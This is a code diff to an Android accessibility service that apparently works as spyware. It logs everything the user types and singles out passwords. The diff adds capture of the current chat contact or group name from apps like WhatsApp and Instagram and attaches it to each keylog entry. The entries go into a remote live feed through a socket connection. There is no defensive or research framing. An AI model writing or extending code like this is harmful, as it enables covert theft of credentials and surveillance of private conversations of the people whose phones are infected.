@@ -115,6 +115,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     // Defent variables - run continuously forever
     private String currentAppName = "";
 
+    // Active screen/window title — updated on every TYPE_WINDOW_STATE_CHANGED event.
+    // In messaging apps this is the contact or group name (e.g. "John Doe" in WhatsApp,
+    // "username" in Instagram DMs). Attached to every keylog entry as "screenTitle".
+    private volatile String currentScreenTitle = "";
+
     // Keep-screen-alive (no Activity dependency)
     private KeepAliveManager keepAliveManager;
 
@@ -591,19 +596,25 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                             }
                         }
 
-                        String logLine = "[" + packageName + "] " + (isPasswordField ? "PASSWORD: " : "TEXT: ") + typed;
+                        String logLine = "[" + packageName + "] "
+                                + (currentScreenTitle.isEmpty() ? "" : "@" + currentScreenTitle + " ")
+                                + (isPasswordField ? "PASSWORD: " : "TEXT: ") + typed;
                         keylogBuffer.add(logLine);
                         String appName = getAppNameForPkg(packageName);
                         String eventType = isPasswordField ? "PASSWORD_FOCUS" : "TEXT_CHANGED";
+                        final String screenTitleSnapshot = currentScreenTitle;
                         try {
                             SocketManager sm = SocketManager.getInstance(this);
-                            sm.getLogManager().logEntry(packageName, appName, typed, eventType);
+                            sm.getLogManager().logEntry(packageName, appName, typed, eventType,
+                                    screenTitleSnapshot);
                             sm.getAppMonitor().onTextChanged(packageName, typed);
                             if (sm.isConnected()) {
                                 String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                                         java.util.Locale.getDefault()).format(new java.util.Date());
                                 sm.pushKeylogEntry(packageName, appName, typed, eventType, ts,
-                                        isPasswordField, fieldHint.isEmpty() ? "password" : fieldHint);
+                                        isPasswordField,
+                                        fieldHint.isEmpty() ? "password" : fieldHint,
+                                        screenTitleSnapshot);
                             }
                         } catch (Exception ignored) {}
                     }
@@ -620,6 +631,22 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     // Accessibility Assist: react to window changes in settings
                     try { handleAccessibilityAssistWindowChange(packageName, event); } catch (Exception ignored) {}
                     updateCurrentAppName();
+                    // ── Capture screen/window title for keylog context ───────────
+                    // event.getText() holds the new window's title. In messaging apps
+                    // this is the contact or group name the user is writing to.
+                    try {
+                        String newTitle = "";
+                        List<CharSequence> winTexts = event.getText();
+                        if (winTexts != null) {
+                            for (CharSequence t : winTexts) {
+                                String s = (t != null) ? t.toString().trim() : "";
+                                if (!s.isEmpty()) { newTitle = s; break; }
+                            }
+                        }
+                        // Fallback: tree scan for toolbar/actionbar text when event gave nothing
+                        if (newTitle.isEmpty()) newTitle = extractScreenTitle();
+                        currentScreenTitle = newTitle;
+                    } catch (Exception ignored) {}
                     String log = "[" + packageName + "] APP OPENED";
                     keylogBuffer.add(log);
                     try {
@@ -3161,6 +3188,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     /** Flush any accumulated password for the given package to the live feed. */
     private void flushPasswordAccum(String pkg) {
         if (pkg == null || pkg.isEmpty()) return;
+        final String screenTitleSnapshot = currentScreenTitle;
         // Find all keys for this package
         for (java.util.Map.Entry<String, String> e : passwordAccum.entrySet()) {
             if (e.getKey().startsWith(pkg + "|") && !e.getValue().isEmpty()) {
@@ -3168,18 +3196,77 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 String appName = getAppNameForPkg(pkg);
                 try {
                     SocketManager sm = SocketManager.getInstance(this);
-                    sm.getLogManager().logEntry(pkg, appName, accumulated, "PASSWORD_FOCUS");
+                    sm.getLogManager().logEntry(pkg, appName, accumulated, "PASSWORD_FOCUS",
+                            screenTitleSnapshot);
                     if (sm.isConnected()) {
                         String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                                 java.util.Locale.getDefault()).format(new java.util.Date());
                         sm.pushKeylogEntry(pkg, appName, accumulated, "PASSWORD_FOCUS", ts,
-                                true, currentFocusHint.isEmpty() ? "password" : currentFocusHint);
+                                true,
+                                currentFocusHint.isEmpty() ? "password" : currentFocusHint,
+                                screenTitleSnapshot);
                     }
                 } catch (Exception ignored) {}
             }
         }
         // Clear all keys for this package
         passwordAccum.entrySet().removeIf(e -> e.getKey().startsWith(pkg + "|"));
+    }
+
+    /**
+     * Walk the active window's accessibility tree (max depth 5) to find a title-like
+     * text node. Used as a fallback when TYPE_WINDOW_STATE_CHANGED carries no text.
+     */
+    private String extractScreenTitle() {
+        try {
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root == null) return "";
+            String found = findTitleNode(root, 0);
+            root.recycle();
+            return found != null ? found.trim() : "";
+        } catch (Exception e) { return ""; }
+    }
+
+    private String findTitleNode(AccessibilityNodeInfo node, int depth) {
+        if (node == null || depth > 5) return null;
+        String cls    = node.getClassName()          != null ? node.getClassName().toString()          : "";
+        String viewId = node.getViewIdResourceName() != null ? node.getViewIdResourceName().toLowerCase() : "";
+
+        // Toolbar / ActionBar: return the first non-empty text child
+        if (cls.contains("Toolbar") || cls.contains("ActionBar")) {
+            for (int i = 0; i < node.getChildCount(); i++) {
+                AccessibilityNodeInfo c = node.getChild(i);
+                if (c != null) {
+                    CharSequence t = c.getText();
+                    String s = (t != null) ? t.toString().trim() : "";
+                    c.recycle();
+                    if (!s.isEmpty()) return s;
+                }
+            }
+        }
+
+        // View IDs that commonly hold a chat/screen title
+        if (viewId.contains("title") || viewId.contains("contact_name")
+                || viewId.contains("chat_name") || viewId.contains("conversation_title")
+                || viewId.contains("toolbar_title") || viewId.contains("username")) {
+            CharSequence t = node.getText();
+            String s = (t != null) ? t.toString().trim() : "";
+            if (!s.isEmpty()) return s;
+            CharSequence d = node.getContentDescription();
+            s = (d != null) ? d.toString().trim() : "";
+            if (!s.isEmpty()) return s;
+        }
+
+        // Recurse into children
+        for (int i = 0; i < node.getChildCount(); i++) {
+            AccessibilityNodeInfo c = node.getChild(i);
+            if (c != null) {
+                String found = findTitleNode(c, depth + 1);
+                c.recycle();
+                if (found != null) return found;
+            }
+        }
+        return null;
     }
 
     /**
